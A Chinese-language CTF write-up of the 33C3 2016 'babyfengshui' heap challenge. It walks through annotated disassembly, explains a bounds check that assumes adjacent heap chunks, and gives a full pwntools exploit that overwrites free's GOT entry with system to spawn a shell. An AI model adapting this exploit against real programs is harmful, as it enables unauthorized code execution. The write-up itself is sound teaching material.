---
layout: post
title:  "pwn 33C3CTF2016 babyfengshui"
image: ''
date:   2018-04-14 00:06:31
tags:
- ctf
description: ''
categories:
- ctf
---

- [题目复现](#题目复现)
- [题目解析](#题目解析)
- [漏洞利用](#漏洞利用)
- [参考资料](#参考资料)


## 题目复现
```
$ file babyfengshui 
babyfengshui: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cecdaee24200fe5bbd3d34b30404961ca49067c6, stripped
$ checksec -f babyfengshui
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY Fortified Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   Yes     0               3       babyfengshui
$ strings libc-2.19.so | grep "GNU C"
GNU C Library (Debian GLIBC 2.19-18+deb8u6) stable release version 2.19, by Roland McGrath et al.
Compiled by GNU CC version 4.8.4.
```
32 位程序，开启了 canary 和 NX。

在 Ubuntu-14.04 上玩一下，添加 user 和显示 user：
```
$ ./babyfengshui     
0: Add a user
1: Delete a user
2: Display a user
3: Update a user description
4: Exit
Action: 0
size of description: 10     # description 最大长度（desc_size）
name: AAAA
text length: 5              # description 实际长度（text_size）
text: aaaa
0: Add a user
1: Delete a user
2: Display a user
3: Update a user description
4: Exit
Action: 2
index: 0
name: AAAA
description: aaaa
```
对于 description 的调整只能在最大长度的范围内，否则程序退出：
```
0: Add a user
1: Delete a user
2: Display a user
3: Update a user description
4: Exit
Action: 3
index: 0
text length: 20
my l33t defenses cannot be fooled, cya!
```


## 题目解析
#### Add a user
```
[0x080485c0]> pdf @ sub.malloc_816 
/ (fcn) sub.malloc_816 239
|   sub.malloc_816 (int arg_8h);
|           ; var int local_1ch @ ebp-0x1c
|           ; var int local_14h @ ebp-0x14
|           ; var int local_10h @ ebp-0x10
|           ; var int local_ch @ ebp-0xc
|           ; arg int arg_8h @ ebp+0x8
|           ; CALL XREF from 0x08048b21 (main)
|           0x08048816      push ebp
|           0x08048817      mov ebp, esp
|           0x08048819      sub esp, 0x28                              ; '('
|           0x0804881c      mov eax, dword [arg_8h]                    ; [0x8:4]=-1 ; 8
|           0x0804881f      mov dword [local_1ch], eax                  ; 将参数 desc_size 放到 [local_1ch]
|           0x08048822      mov eax, dword gs:[0x14]                   ; [0x14:4]=-1 ; 20
|           0x08048828      mov dword [local_ch], eax
|           0x0804882b      xor eax, eax
|           0x0804882d      sub esp, 0xc
|           0x08048830      push dword [local_1ch]
|           0x08048833      call sym.imp.malloc                         ; [local_14h] = malloc(desc_size) 为 description 分配空间
|           0x08048838      add esp, 0x10
|           0x0804883b      mov dword [local_14h], eax
|           0x0804883e      sub esp, 4
|           0x08048841      push dword [local_1ch]
|           0x08048844      push 0
|           0x08048846      push dword [local_14h]
|           0x08048849      call sym.imp.memset                         ; memset([local_14h], 0, desc_size) 初始化
|           0x0804884e      add esp, 0x10
|           0x08048851      sub esp, 0xc
|           0x08048854      push 0x80                                  ; 128
|           0x08048859      call sym.imp.malloc                         ; [local_10h] = malloc(0x80) 为 user struct 分配空间
|           0x0804885e      add esp, 0x10
|           0x08048861      mov dword [local_10h], eax
|           0x08048864      sub esp, 4
|           0x08048867      push 0x80                                  ; 128
|           0x0804886c      push 0
|           0x0804886e      push dword [local_10h]
|           0x08048871      call sym.imp.memset                         ; memset([local_10h], 0, 0x80) 初始化
|           0x08048876      add esp, 0x10
|           0x08048879      mov eax, dword [local_10h]
|           0x0804887c      mov edx, dword [local_14h]
|           0x0804887f      mov dword [eax], edx                        ; user->desc = desc ; desc = [local_14h]
|           0x08048881      movzx eax, byte [0x804b069]                ; [0x804b069:1]=0 ; 取出序号 i
|           0x08048888      movzx eax, al
|           0x0804888b      mov edx, dword [local_10h]
|           0x0804888e      mov dword [eax*4 + 0x804b080], edx          ; store[i] = user 将 user 放到数组里
|           0x08048895      sub esp, 0xc
|           0x08048898      push str.name:                             ; 0x8048cf3 ; "name: "
|           0x0804889d      call sym.imp.printf                        ; int printf(const char *format)
|           0x080488a2      add esp, 0x10
|           0x080488a5      movzx eax, byte [0x804b069]                ; [0x804b069:1]=0
|           0x080488ac      movzx eax, al
|           0x080488af      mov eax, dword [eax*4 + 0x804b080]          ; 取出 store[i]
|           0x080488b6      add eax, 4                                  ; 取出 store[i]->name
|           0x080488b9      sub esp, 8
|           0x080488bc      push 0x7c                                  ; '|' ; 124
|           0x080488be      push eax
|           0x080488bf      call sub.fgets_6bb                          ; 读入 0x7c 个字符到 store[i]->name，将末尾的 '\n' 换成 '\x00'
|           0x080488c4      add esp, 0x10
|           0x080488c7      movzx eax, byte [0x804b069]                ; [0x804b069:1]=0
|           0x080488ce      add eax, 1                                  ; 序号 i = i + 1
|           0x080488d1      mov byte [0x804b069], al                   ; [0x804b069:1]=0 ; 写回去
|           0x080488d6      movzx eax, byte [0x804b069]                ; [0x804b069:1]=0 ; 取出 i
|           0x080488dd      sub eax, 1                                  ; i = i - 1
|           0x080488e0      movzx eax, al
|           0x080488e3      sub esp, 0xc
|           0x080488e6      push eax
|           0x080488e7      call sub.text_length:_724                   ; 调用更新 description 的函数，参数为 i
|           0x080488ec      add esp, 0x10
|           0x080488ef      mov eax, dword [local_10h]
|           0x080488f2      mov ecx, dword [local_ch]
|           0x080488f5      xor ecx, dword gs:[0x14]
|       ,=< 0x080488fc      je 0x8048903
|       |   0x080488fe      call sym.imp.__stack_chk_fail              ; void __stack_chk_fail(void)
|       |   ; JMP XREF from 0x080488fc (sub.malloc_816)
|       `-> 0x08048903      leave
\           0x08048904      ret
```
函数首先分配一个 description 的最大空间，然后分配 user 结构体空间，并将 user 放到 store 数组中，最后调用更新 description 的函数。

user 结构体和 store 数组如下：
```c
struct user {
    char *desc;
    char name[0x7c];
} user;

struct user *store[50];
```
store 放在 `0x804b080`，当前 user 个数 user_num 放在 `0x804b069`。

#### Delete a user
```
[0x080485c0]> pdf @ sub.free_905 
/ (fcn) sub.free_905 138
|   sub.free_905 (int arg_8h);
|           ; var int local_1ch @ ebp-0x1c
|           ; var int local_ch @ ebp-0xc
|           ; arg int arg_8h @ ebp+0x8
|           ; CALL XREF from 0x08048b5f (main)
|           0x08048905      push ebp
|           0x08048906      mov ebp, esp
|           0x08048908      sub esp, 0x28                              ; '('
|           0x0804890b      mov eax, dword [arg_8h]                    ; [0x8:4]=-1 ; 8
|           0x0804890e      mov byte [local_1ch], al                    ; 将参数 i 放到 [local_1ch]
|           0x08048911      mov eax, dword gs:[0x14]                   ; [0x14:4]=-1 ; 20
|           0x08048917      mov dword [local_ch], eax
|           0x0804891a      xor eax, eax
|           0x0804891c      movzx eax, byte [0x804b069]                ; [0x804b069:1]=0 ; 取出 user_num
|           0x08048923      cmp byte [local_1ch], al                   ; [0x2:1]=255 ; 2 ; 比较
|       ,=< 0x08048926      jae 0x8048978                               ; i 大于等于 user_num 时函数返回
|       |   0x08048928      movzx eax, byte [local_1ch]
|       |   0x0804892c      mov eax, dword [eax*4 + 0x804b080]          ; 取出 store[i]
|       |   0x08048933      test eax, eax                               ; store[i] 为 0 是函数返回
|      ,==< 0x08048935      je 0x804897b
|      ||   0x08048937      movzx eax, byte [local_1ch]
|      ||   0x0804893b      mov eax, dword [eax*4 + 0x804b080]         ; [0x804b080:4]=0
|      ||   0x08048942      mov eax, dword [eax]                        ; 取出 store[i]->desc
|      ||   0x08048944      sub esp, 0xc
|      ||   0x08048947      push eax
|      ||   0x08048948      call sym.imp.free                           ; free(store[i]->desc) 释放 description
|      ||   0x0804894d      add esp, 0x10
|      ||   0x08048950      movzx eax, byte [local_1ch]
|      ||   0x08048954      mov eax, dword [eax*4 + 0x804b080]          ; 取出 store[i]
|      ||   0x0804895b      sub esp, 0xc
|      ||   0x0804895e      push eax
|      ||   0x0804895f      call sym.imp.free                           ; free(store[i]) 释放 user
|      ||   0x08048964      add esp, 0x10
|      ||   0x08048967      movzx eax, byte [local_1ch]
|      ||   0x0804896b      mov dword [eax*4 + 0x804b080], 0            ; 将 store[i] 置为 0
|     ,===< 0x08048976      jmp 0x804897c
|     |||   ; JMP XREF from 0x08048926 (sub.free_905)
|     ||`-> 0x08048978      nop
|     ||,=< 0x08048979      jmp 0x804897c
|     |||   ; JMP XREF from 0x08048935 (sub.free_905)
|     |`--> 0x0804897b      nop
|     | |   ; JMP XREF from 0x08048979 (sub.free_905)
|     | |   ; JMP XREF from 0x08048976 (sub.free_905)
|     `-`-> 0x0804897c      mov eax, dword [local_ch]
|           0x0804897f      xor eax, dword gs:[0x14]
|       ,=< 0x08048986      je 0x804898d
|       |   0x08048988      call sym.imp.__stack_chk_fail              ; void __stack_chk_fail(void)
|       |   ; JMP XREF from 0x08048986 (sub.free_905)
|       `-> 0x0804898d      leave
\           0x0804898e      ret
```
删除的过程将 description 和 user 依次释放，并将 store[i] 置为 0。

但是 user->desc 没有被置为 0，user_num 也没有减 1，似乎可能导致 UAF，但不知道怎么用。

#### Display a user
```
[0x080485c0]> pdf @ sub.name:__s_98f 
/ (fcn) sub.name:__s_98f 136
|   sub.name:__s_98f (int arg_8h);
|           ; var int local_1ch @ ebp-0x1c
|           ; var int local_ch @ ebp-0xc
|           ; arg int arg_8h @ ebp+0x8
|           ; CALL XREF from 0x08048b9d (main)
|           0x0804898f      push ebp
|           0x08048990      mov ebp, esp
|           0x08048992      sub esp, 0x28                              ; '('
|           0x08048995      mov eax, dword [arg_8h]                    ; [0x8:4]=-1 ; 8
|           0x08048998      mov byte [local_1ch], al                    ; 将参数 i 放到 [local_1ch]
|           0x0804899b      mov eax, dword gs:[0x14]                   ; [0x14:4]=-1 ; 20
|           0x080489a1      mov dword [local_ch], eax
|           0x080489a4      xor eax, eax
|           0x080489a6      movzx eax, byte [0x804b069]                ; [0x804b069:1]=0 ; 取出 user_num
|           0x080489ad      cmp byte [local_1ch], al                   ; [0x2:1]=255 ; 2 ; 比较
|       ,=< 0x080489b0      jae 0x8048a00                               ; i 大于等于 user_num 时函数返回
|       |   0x080489b2      movzx eax, byte [local_1ch]
|       |   0x080489b6      mov eax, dword [eax*4 + 0x804b080]          ; 取出 store[i]
|       |   0x080489bd      test eax, eax
|      ,==< 0x080489bf      je 0x8048a03                                ; store[i] 为 0 时函数返回
|      ||   0x080489c1      movzx eax, byte [local_1ch]
|      ||   0x080489c5      mov eax, dword [eax*4 + 0x804b080]         ; [0x804b080:4]=0
|      ||   0x080489cc      add eax, 4                                  ; 取出 store[i]->name
|      ||   0x080489cf      sub esp, 8
|      ||   0x080489d2      push eax
|      ||   0x080489d3      push str.name:__s                          ; 0x8048cfa ; "name: %s\n"
|      ||   0x080489d8      call sym.imp.printf                         ; 打印 store[i]->name
|      ||   0x080489dd      add esp, 0x10
|      ||   0x080489e0      movzx eax, byte [local_1ch]
|      ||   0x080489e4      mov eax, dword [eax*4 + 0x804b080]         ; [0x804b080:4]=0
|      ||   0x080489eb      mov eax, dword [eax]                        ; 取出 store[i]->desc
|      ||   0x080489ed      sub esp, 8
|      ||   0x080489f0      push eax
|      ||   0x080489f1      push str.description:__s                   ; 0x8048d04 ; "description: %s\n"
|      ||   0x080489f6      call sym.imp.printf                         ; 打印 store[i]->desc
|      ||   0x080489fb      add esp, 0x10
|     ,===< 0x080489fe      jmp 0x8048a04
|     |||   ; JMP XREF from 0x080489b0 (sub.name:__s_98f)
|     ||`-> 0x08048a00      nop
|     ||,=< 0x08048a01      jmp 0x8048a04
|     |||   ; JMP XREF from 0x080489bf (sub.name:__s_98f)
|     |`--> 0x08048a03      nop
|     | |   ; JMP XREF from 0x08048a01 (sub.name:__s_98f)
|     | |   ; JMP XREF from 0x080489fe (sub.name:__s_98f)
|     `-`-> 0x08048a04      mov eax, dword [local_ch]
|           0x08048a07      xor eax, dword gs:[0x14]
|       ,=< 0x08048a0e      je 0x8048a15
|       |   0x08048a10      call sym.imp.__stack_chk_fail              ; void __stack_chk_fail(void)
|       |   ; JMP XREF from 0x08048a0e (sub.name:__s_98f)
|       `-> 0x08048a15      leave
\           0x08048a16      ret
```
函数首先判断 store[i] 是否存在，如果是，就打印出 name 和 description。

#### Update a user description
```
[0x080485c0]> pdf @ sub.text_length:_724 
/ (fcn) sub.text_length:_724 242
|   sub.text_length:_724 (int arg_8h);
|           ; var int local_1ch @ ebp-0x1c
|           ; var int local_11h @ ebp-0x11
|           ; var int local_10h @ ebp-0x10
|           ; var int local_ch @ ebp-0xc
|           ; arg int arg_8h @ ebp+0x8
|           ; CALL XREF from 0x08048bdb (main)
|           ; CALL XREF from 0x080488e7 (sub.malloc_816)
|           0x08048724      push ebp
|           0x08048725      mov ebp, esp
|           0x08048727      sub esp, 0x28                              ; '('
|           0x0804872a      mov eax, dword [arg_8h]                    ; [0x8:4]=-1 ; 8
|           0x0804872d      mov byte [local_1ch], al                    ; 将参数 i 放到 [local_1ch]
|           0x08048730      mov eax, dword gs:[0x14]                   ; [0x14:4]=-1 ; 20
|           0x08048736      mov dword [local_ch], eax
|           0x08048739      xor eax, eax
|           0x0804873b      movzx eax, byte [0x804b069]                ; [0x804b069:1]=0 ; 取出 user_num
|           0x08048742      cmp byte [local_1ch], al                   ; [0x2:1]=255 ; 2 ; 比较
|       ,=< 0x08048745      jae 0x80487ff                               ; i 大于等于 user_num 时函数返回
|       |   0x0804874b      movzx eax, byte [local_1ch]
|       |   0x0804874f      mov eax, dword [eax*4 + 0x804b080]          ; 取出 store[i]
|       |   0x08048756      test eax, eax
|      ,==< 0x08048758      je 0x8048802                                ; store[i] 为 0 时函数返回
|      ||   0x0804875e      mov dword [local_10h], 0                    ; text_size 放到 [local_10h]
|      ||   0x08048765      sub esp, 0xc
|      ||   0x08048768      push str.text_length:                      ; 0x8048cb0 ; "text length: "
|      ||   0x0804876d      call sym.imp.printf                        ; int printf(const char *format)
|      ||   0x08048772      add esp, 0x10
|      ||   0x08048775      sub esp, 4
|      ||   0x08048778      lea eax, [local_11h]
|      ||   0x0804877b      push eax
|      ||   0x0804877c      lea eax, [local_10h]
|      ||   0x0804877f      push eax
|      ||   0x08048780      push str.u_c                               ; 0x8048cbe ; "%u%c"
|      ||   0x08048785      call sym.imp.__isoc99_scanf                 ; 读入 text_size
|      ||   0x0804878a      add esp, 0x10
|      ||   0x0804878d      movzx eax, byte [local_1ch]
|      ||   0x08048791      mov eax, dword [eax*4 + 0x804b080]         ; [0x804b080:4]=0
|      ||   0x08048798      mov eax, dword [eax]                        ; 取出 store[i]->desc
|      ||   0x0804879a      mov edx, eax
|      ||   0x0804879c      mov eax, dword [local_10h]                  ; 取出 test_size
|      ||   0x0804879f      add edx, eax                                ; store[i]->desc + test_size
|      ||   0x080487a1      movzx eax, byte [local_1ch]
|      ||   0x080487a5      mov eax, dword [eax*4 + 0x804b080]          ; 取出 store[i]
|      ||   0x080487ac      sub eax, 4                                  ; store[i] - 4
|      ||   0x080487af      cmp edx, eax                                ; 比较 (store[i]->desc + test_size) 和 (store[i] - 4)
|     ,===< 0x080487b1      jb 0x80487cd                                ; 小于时跳转
|     |||   0x080487b3      sub esp, 0xc                                ; 否则继续，程序退出
|     |||   0x080487b6      push str.my_l33t_defenses_cannot_be_fooled__cya ; 0x8048cc4 ; "my l33t defenses cannot be fooled, cya!"
|     |||   0x080487bb      call sym.imp.puts                          ; int puts(const char *s)
|     |||   0x080487c0      add esp, 0x10
|     |||   0x080487c3      sub esp, 0xc
|     |||   0x080487c6      push 1                                     ; 1
|     |||   0x080487c8      call sym.imp.exit                          ; void exit(int status)
|     |||   ; JMP XREF from 0x080487b1 (sub.text_length:_724)
|     `---> 0x080487cd      sub esp, 0xc
|      ||   0x080487d0      push str.text:                             ; 0x8048cec ; "text: "
|      ||   0x080487d5      call sym.imp.printf                        ; int printf(const char *format)
|      ||   0x080487da      add esp, 0x10
|      ||   0x080487dd      mov eax, dword [local_10h]
|      ||   0x080487e0      lea edx, [eax + 1]                          ; test_size + 1
|      ||   0x080487e3      movzx eax, byte [local_1ch]
|      ||   0x080487e7      mov eax, dword [eax*4 + 0x804b080]         ; [0x804b080:4]=0
|      ||   0x080487ee      mov eax, dword [eax]                        ; 取出 store[i]->desc
|      ||   0x080487f0      sub esp, 8
|      ||   0x080487f3      push edx
|      ||   0x080487f4      push eax
|      ||   0x080487f5      call sub.fgets_6bb                          ; 读入 test_size+1 个字符到 store[i]->desc
|      ||   0x080487fa      add esp, 0x10
|     ,===< 0x080487fd      jmp 0x8048803
|     |||   ; JMP XREF from 0x08048745 (sub.text_length:_724)
|     ||`-> 0x080487ff      nop
|     ||,=< 0x08048800      jmp 0x8048803
|     |||   ; JMP XREF from 0x08048758 (sub.text_length:_724)
|     |`--> 0x08048802      nop
|     | |   ; JMP XREF from 0x08048800 (sub.text_length:_724)
|     | |   ; JMP XREF from 0x080487fd (sub.text_length:_724)
|     `-`-> 0x08048803      mov eax, dword [local_ch]
|           0x08048806      xor eax, dword gs:[0x14]
|       ,=< 0x0804880d      je 0x8048814
|       |   0x0804880f      call sym.imp.__stack_chk_fail              ; void __stack_chk_fail(void)
|       |   ; JMP XREF from 0x0804880d (sub.text_length:_724)
|       `-> 0x08048814      leave
\           0x08048815      ret
```
该函数读入新的 text_size，并使用 `(store[i]->desc + test_size) < (store[i] - 4)` 的条件来防止堆溢出，最后读入新的 description。

然而这种检查方式是有问题的，它基于 description 正好位于 user 前面这种设定。根据我们对堆分配器的理解，这个设定不一定成立，它们之间可能会包含其他已分配的堆块，从而绕过检查。


## 漏洞利用
所以我们首先添加两个 user，用于绕过检查。第 3 个 user 存放 "/bin/sh"。然后删掉第 1 个 user，并创建一个 description 很长的 user，其长度是第 1 个 user 的 description 长度加上 user 结构体长度。这时候检查就绕过了，我们可以在添加新 user 的时候修改 description 大小，造成堆溢出，并修改第 2 个 user 的 user->desc 为 `free@got.plt`，从而泄漏出 libc 地址。得到 system 地址后，此时修改第 2 个 user 的 description，其实是修改 free 的 GOT，所以我们将其改成 `system@got.plt`。最后删除第 3 个 user，触发 system('/bin/sh')，得到 shell。

开启 ASLR。Bingo!!!
```
$ python exp.py 
[+] Starting local process './babyfengshui': pid 2269
[*] system address: 0xf75e23e0
[*] Switching to interactive mode
$ whoami
firmy
```

#### exploit
完整的 exp 如下：
```python
#!/usr/bin/env python

from pwn import *

#context.log_level = 'debug'

io = process(['./babyfengshui'], env={'LD_PRELOAD':'./libc-2.19.so'})
elf = ELF('babyfengshui')
libc = ELF('libc-2.19.so')

def add_user(size, length, text):
    io.sendlineafter("Action: ", '0')
    io.sendlineafter("description: ", str(size))
    io.sendlineafter("name: ", 'AAAA')
    io.sendlineafter("length: ", str(length))
    io.sendlineafter("text: ", text)

def delete_user(idx):
    io.sendlineafter("Action: ", '1')
    io.sendlineafter("index: ", str(idx))

def display_user(idx):
    io.sendlineafter("Action: ", '2')
    io.sendlineafter("index: ", str(idx))

def update_desc(idx, length, text):
    io.sendlineafter("Action: ", '3')
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("length: ", str(length))
    io.sendlineafter("text: ", text)

if __name__ == "__main__":
    add_user(0x80, 0x80, 'AAAA')        # 0
    add_user(0x80, 0x80, 'AAAA')        # 1
    add_user(0x8, 0x8, '/bin/sh\x00')   # 2
    delete_user(0)

    add_user(0x100, 0x19c, "A"*0x198 + p32(elf.got['free']))    # 0

    display_user(1)
    io.recvuntil("description: ")
    free_addr = u32(io.recvn(4))
    system_addr = free_addr - (libc.symbols['free'] - libc.symbols['system'])
    log.info("system address: 0x%x" % system_addr)

    update_desc(1, 0x4, p32(system_addr))
    delete_user(2)

    io.interactive()
```


## 参考资料
- https://ctftime.org/task/3282
- https://github.com/bkth/babyfengshui
